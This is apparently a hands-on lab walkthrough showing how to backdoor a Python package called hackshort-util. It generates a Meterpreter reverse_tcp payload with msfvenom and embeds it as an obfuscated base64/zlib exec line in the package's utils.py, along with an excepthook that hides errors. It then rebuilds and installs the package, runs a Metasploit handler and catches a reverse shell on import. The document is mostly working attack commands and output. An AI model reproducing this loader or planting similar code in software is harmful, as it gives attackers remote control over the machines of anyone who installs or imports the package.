# Adding a Payload

Generating Python Meterpreter Payload
>``` shell
>kali@kali:~$ msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=192.88.99.76 LPORT=4488
>
># ========== Expected Result ==========
>[-] No platform was selected, choosing Msf::Module::Platform::Python from the payload
>[-] No arch selected, selecting arch: python from the payload
>No encoder specified, outputting raw payload
>Payload size: 436 bytes
>exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrckGMPuUrvtYgURDyIiuHsTWdp01NI0KZmsVsX/7oYsXmZ4b968+ejHyflA0ekBgvw2fSvbBqHIJQZ/0EGGfgTy6jydaW+pb+wb8OVCbEgW/NcxZlinZpUSX8kT3j7e3O+3u6fb6wcRdUo7a0EHztmyWqmyVFWl1gWTeV6WIkpaD81AMpg1TCF6x+EKDcDELwQxddpJHezU6IGzqzsmUXnQHzwX4nnxQrr6hI0gn++9AWrA8k5cmqNdd/ZfPU+0IDCD5vFs1YF24+QBkacPqLbII9lBVMofhmyDv4L8AerjXyE=')[0])))
># =====================================
>```

Modifying utils.py File to Add the Generated Payload
>``` shell
>kali@kali:~/hackshort-util$ nano hackshort_util/utils.py
>
>kali@kali:~/hackshort-util$ cat -n hackshort_util/utils.py
>
># ========== Expected Result ==========
>01  import time
>02  import sys
>03
>04  def standardFunction():
>05          pass
>06
>07  def __getattr__(name):
>08          pass
>09          return standardFunction
>10
>11  def catch_exception(exc_type, exc_value, tb):
>12      while True:
>13          time.sleep(1000)
>14
>15  sys.excepthook = catch_exception
>16
>17  exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrckGMPuUrvtYgURDyIiuHsTWdp01NI0KZmsVsX/7oYsXmZ4b968+ejHyflA0ekBgvw2fSvbBqHIJQZ/0EGGfgTy6jydaW+pb+wb8OVCbEgW/NcxZlinZpUSX8kT3j7e3O+3u6fb6wcRdUo7a0EHztmyWqmyVFWl1gWTeV6WIkpaD81AMpg1TCF6x+EKDcDELwQxddpJHezU6IGzqzsmUXnQHzwX4nnxQrr6hI0gn++9AWrA8k5cmqNdd/ZfPU+0IDCD5vFs1YF24+QBkacPqLbII9lBVMofhmyDv4L8AerjXyE=')[0])))
># =====================================
>```

Logging into Cloud Kali Instance via SSH
>``` shell
>kali@kali:~$ ssh kali@192.88.99.76
>
># ========== Expected Result ==========
>The authenticity of host '192.88.99.76 (192.88.99.76)' can't be established.
>ED25519 key fingerprint is SHA256:uw2cM/UTH1lO2xSphPrIBa66w3XqioWiyrWRgHND/WI.
>This key is not known by any other names.
>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
>Warning: Permanently added '192.88.99.76' (ED25519) to the list of known hosts.
>kali@192.88.99.76's password: 
>
>kali@cloud-kali:~$
># =====================================
>```

Initializing Metasploit's Database
>``` shell
>kali@cloud-kali:~$ sudo msfdb init
>
># ========== Expected Result ==========
>[+] Starting database
>[+] Creating database user 'msf'
>[+] Creating databases 'msf'
>[+] Creating databases 'msf_test'
>[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
>[+] Creating initial database schema
># =====================================
>```

Starting Metasploit and Configuring Handler
>``` shell
>kali@cloud-kali:~$ msfconsole
>
># ========== Expected Result ==========
>...
># =====================================
>
>msf6 > use exploit/multi/handler
>
># ========== Expected Result ==========
>[*] Using configured payload generic/shell_reverse_tcp
># =====================================
>
>msf6 exploit(multi/handler) > set payload python/meterpreter/reverse_tcp
>
># ========== Expected Result ==========
>payload => python/meterpreter/reverse_tcp
># =====================================
>
>msf6 exploit(multi/handler) > set LHOST 0.0.0.0
>
># ========== Expected Result ==========
>LHOST => 0.0.0.0
># =====================================
>
>msf6 exploit(multi/handler) > set LPORT 4488
>
># ========== Expected Result ==========
>LPORT => 4488
># =====================================
>
>msf6 exploit(multi/handler) > set ExitOnSession false
>
># ========== Expected Result ==========
>ExitOnSession => false
># =====================================
>
>msf6 exploit(multi/handler) > run -jz
>
># ========== Expected Result ==========
>[*] Exploit running as background job 0.
>[*] Exploit completed, but no session was created.
>[*] Started reverse TCP handler on 0.0.0.0:4488
># =====================================
>```

Uninstalling, Rebuilding, Reinstalling, and Importing the hackshort-util Package
>``` shell
>kali@kali:~/hackshort-util$ pip uninstall hackshort-util
>
># ========== Expected Result ==========
>...
># =====================================
>
>kali@kali:~/hackshort-util$ python3 ./setup.py sdist
>
># ========== Expected Result ==========
>...
># =====================================
>
>kali@kali:~/hackshort-util$ pip install ./dist/hackshort_util-1.1.4.tar.gz
>
># ========== Expected Result ==========
>...
># =====================================
>
>kali@kali:~/hackshort-util$ python3
>
># ========== Expected Result ==========
>Python 3.11.2 [GCC 12.2.0] on linux
>Type "help", "copyright", "credits" or "license" for more information.
>>>> from hackshort_util import utils
>>>>
># =====================================
>```

Capturing Reverse Shell
>``` shell
>msf6 exploit(multi/handler) >
>[*] Sending stage (24772 bytes) to 233.252.50.125
>[*] Meterpreter session 1 opened (10.0.1.87:4488 -> 233.252.50.125:52342)
>```

Closing the Meterpreter Session
>``` shell
>msf6 exploit(multi/handler) > sessions -i 1
>
># ========== Expected Result ==========
>[*] Starting interaction with 1...
># =====================================
>
>meterpreter > exit
>
># ========== Expected Result ==========
>[*] Shutting down Meterpreter...
>
>[*] 233.252.50.125 - Meterpreter session 1 closed.  Reason: Died
># =====================================
>```
